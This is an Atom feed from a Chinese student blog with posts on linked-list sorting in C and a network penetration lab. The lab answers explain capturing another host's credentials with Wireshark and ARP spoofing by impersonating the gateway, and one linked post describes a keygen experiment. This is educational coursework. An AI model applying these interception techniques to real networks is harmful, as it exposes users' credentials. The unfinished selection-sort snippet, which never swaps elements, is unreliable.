<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://sovegetable.github.io</id>
    <title>心有猛虎  细嗅蔷薇</title>
    <subtitle>In me the tiger sniffs the rose.</subtitle>
    <icon>https://sovegetable.github.io/images/favicon.ico</icon>
    <link href="https://sovegetable.github.io" />
    <author>
      <name>给我坐下犬夜叉</name>
    </author>
    <updated>2020-11-10T12:24:54.000Z</updated>
    <category term="关键词1" />
    <category term="关键词2" />
    <entry>
        <id>https://sovegetable.github.io/tuijian/</id>
        <title>tuijian</title>
        <link rel="alternate" href="https://sovegetable.github.io/tuijian/"/>
        <content type="html">&lt;h2 id=&#34;推荐一下组内成员的博客&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#推荐一下组内成员的博客&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;rainbow&#34;&gt;推荐一下组内成员的博客&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;组员的Csdnblog&#34; style=&#34;--block-color:#e9546b;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvd19pYW1mcmVlL2FydGljbGUvZGV0YWlscy8xMDkxMzA5OTc=&#34; data-background-image=&#34;https://profile.csdnimg.cn/8/A/B/3_wow_iamfree&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvd19pYW1mcmVlL2FydGljbGUvZGV0YWlscy8xMDkxMzA5OTc=&#34;&gt;kfew&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;组内成员 实验--easyfilesharing&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;组员的Csdnblog&#34; style=&#34;--block-color:#e9546b;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvd19pYW1mcmVlL2FydGljbGUvZGV0YWlscy8xMDk0NDExNTQ=&#34; data-background-image=&#34;https://avatar.csdnimg.cn/8/A/B/3_wow_iamfree_1602906513.jpg&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvd19pYW1mcmVlL2FydGljbGUvZGV0YWlscy8xMDk0NDExNTQ=&#34;&gt;kfew&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;组内成员 实验——注册机&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
</content>
        <category term="homework" scheme="https://sovegetable.github.io/tags/homework/" />
        <updated>2020-11-10T12:24:54.000Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</id>
        <title>数据结构链表的排序实现</title>
        <link rel="alternate" href="https://sovegetable.github.io/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vb25lcGl4ZWwvcC83Njc0NjU5Lmh0bWw=&#34;&gt;链接：十大经典排序算法（动画演示）&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;冒泡排序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#冒泡排序&#34;&gt;#&lt;/a&gt; 冒泡排序&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PNode p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//PNode 是结构体指针&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; head&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;//p 赋值为数据域的第一个元素，遍历一遍&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; q &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; q&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// 相当于是将 p 和其后的所有元素比较&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;     &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;data&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;     &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; tp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; q&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; q&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tp&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;hr&gt;
&lt;h2 id=&#34;选择排序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#选择排序&#34;&gt;#&lt;/a&gt; 选择排序&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PNode p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;Min&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//PNode 是结构体指针&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; head&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 假定 p 为所有元素的最小值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; q &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; q&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;//p 和其后所有比较，有小于 p 的话交换位置&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;data&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         Min&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;q&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;hr&gt;
&lt;h2 id=&#34;快速排序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#快速排序&#34;&gt;#&lt;/a&gt; 快速排序&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;QuickSort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;linklist &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;head&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;linklist &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; tail&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;// 递归结束条件：当只有 head 与 tail 元素时结束，因为每次我们传进来 mid 其实 mid 已经不用排序，如果只有两个元素而 mid 不需要排序则递归结束&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;head&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;tail&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;//p 连接的是比 mid 小的值的链表，q 连接是比 mid 大值的链表并且包括 mid&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	listPoint mid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;head&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	listPoint p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;head&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	listPoint q&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	listPoint t&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mid&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; pivot&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mid&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;tail&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;key&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;pivot&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			q&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		t&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;t&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;//p 链表连接上 q 链表 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	q&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;next&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;tail&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//q 链表尾部指向 NULL &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;QuickSort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;head&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 递归调用 QuickSort&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;QuickSort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;tail&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1cnV6dW4vYXJ0aWNsZS9kZXRhaWxzLzI1MDAxMDg1P3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudF90MC5ub25lLXRhc2stYmxvZy1CbG9nQ29tbWVuZEZyb21NYWNoaW5lTGVhcm5QYWkyLTEuY2hhbm5lbF9wYXJhbSZhbXA7ZGVwdGhfMS11dG1fc291cmNlPWRpc3RyaWJ1dGUucGNfcmVsZXZhbnRfdDAubm9uZS10YXNrLWJsb2ctQmxvZ0NvbW1lbmRGcm9tTWFjaGluZUxlYXJuUGFpMi0xLmNoYW5uZWxfcGFyYW0=&#34;&gt;C 语言链表快速排序&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;挖个坑... 未完待续...&lt;/p&gt;
</content>
        <category term="数据结构" scheme="https://sovegetable.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" />
        <updated>2020-11-04T10:56:07.000Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/test2/</id>
        <title>网络渗透实验二</title>
        <link rel="alternate" href="https://sovegetable.github.io/test2/"/>
        <content type="html">&lt;h2 id=&#34;1-a主机上外网b运行sinfferwireshark选定只抓源为a的数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-a主机上外网b运行sinfferwireshark选定只抓源为a的数据&#34;&gt;#&lt;/a&gt; 1、A 主机上外网，B 运行 sinffer (Wireshark) 选定只抓源为 A 的数据)。&lt;/h2&gt;
&lt;h5 id=&#34;11-写出以上过滤语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11-写出以上过滤语句&#34;&gt;#&lt;/a&gt; 1.1 写出以上过滤语句。&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;ip.src == ipaddress of A&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpdWNoYW94dWFuL2FydGljbGUvZGV0YWlscy84MTYwNTI1Nw==&#34;&gt;wireshark 过滤规则及使用方法&lt;/span&gt;&lt;/p&gt;
&lt;h5 id=&#34;12-b是否能看到a和外网的通信a刚输入的帐户和口令为什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12-b是否能看到a和外网的通信a刚输入的帐户和口令为什么&#34;&gt;#&lt;/a&gt; 1.2 B 是否能看到 A 和外网的通信（A 刚输入的帐户和口令）？为什么？&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;能，因为我们都是在一个网段下。网关会向所有人发送报文，不是本机 ip 会被电脑自动丢弃&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;21-为了捕获a到外网的数据b实施arp欺骗攻击b将冒充该子网的什么实体&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-为了捕获a到外网的数据b实施arp欺骗攻击b将冒充该子网的什么实体&#34;&gt;#&lt;/a&gt; 2.1 为了捕获 A 到外网的数据，B 实施 ARP 欺骗攻击，B 将冒充该子网的什么实体？&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;网关 （gateway）&lt;/p&gt;
&lt;/blockquote&gt;
